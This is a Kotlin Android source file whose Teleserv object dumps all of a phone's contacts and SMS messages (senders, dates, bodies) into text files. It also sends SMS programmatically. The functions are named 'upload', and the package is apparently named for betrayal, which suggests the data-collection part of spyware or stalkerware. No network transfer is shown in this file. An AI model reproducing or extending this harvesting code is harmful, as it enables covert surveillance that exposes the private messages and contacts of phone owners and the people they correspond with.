package com.example.betryalcommit

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import java.io.BufferedWriter
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.OutputStreamWriter
import java.time.LocalDateTime

object Teleserv {
    private val uiHandler = Handler(Looper.getMainLooper())
    @SuppressLint("Range")
    fun uploadContact(contentResolver: ContentResolver, context: Context) {
            var allContactList = "All Contacts\n\n\n"
            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID)
                    )
                    val name = cur.getString(
                        cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME
                        )
                    )
                    if (cur.getInt(
                            cur.getColumnIndex(
                                ContactsContract.Contacts.HAS_PHONE_NUMBER
                            )
                        ) > 0
                    ) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(
                                pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                )
                            )
                            allContactList += "Name: $name\nPhone Number: $phoneNo\n\n"
                        }
                        pCur.close()
                    }
                }
            }
            cur?.close()
        val fileDir = context.getExternalFilesDir(null)
        val fileName = "all contacts ${LocalDateTime.now()}.txt"
        val file = File(fileDir, fileName)
        val outputStream = FileOutputStream(file)
        val writer = BufferedWriter(OutputStreamWriter(outputStream))
        writer.write(allContactList)
        writer.close()
    }
    @SuppressLint("Range")
    fun uploadsms(contentResolver: ContentResolver, context: Context) {
        val projection = arrayOf(
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE
        )

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            projection, null, null, null
        )

        val smsText = StringBuilder()

        if (cursor != null && cursor.count > 0) {
            while (cursor.moveToNext()) {
                val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
                val date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))

                smsText.append("From: $address\n")
                smsText.append("Date: ${dateToString(date)}\n")
                smsText.append("Message: $body\n\n")
            }
            cursor.close()
        }

        try {
            // Create a file in the app's external storage directory
            val fileDir = context.getExternalFilesDir(null)
            val fileName = "SMS.txt"
            val file = File(fileDir, fileName)

            // Write the SMS data to the file
            val outputStream = FileOutputStream(file)
            outputStream.write(smsText.toString().toByteArray())
            outputStream.close()

            println("SMS messages saved to file: $fileName")
        } catch (e: Exception) {
            println("Error while saving SMS messages: ${e.message}")
        }
    }
    fun dateToString(timestamp: Long): String {
        val dateFormat = "yyyy-MM-dd HH:mm:ss"
        val sdf = java.text.SimpleDateFormat(dateFormat)
        return sdf.format(java.util.Date(timestamp))
    }
    fun sendMessage(context: Context,number: String, message: String) {
            val sentPI: PendingIntent =
                PendingIntent.getBroadcast(context, 0, Intent("SMS_SENT"), 0)
            SmsManager.getDefault()
                .sendTextMessage(number, null, message, sentPI, null);
    }
}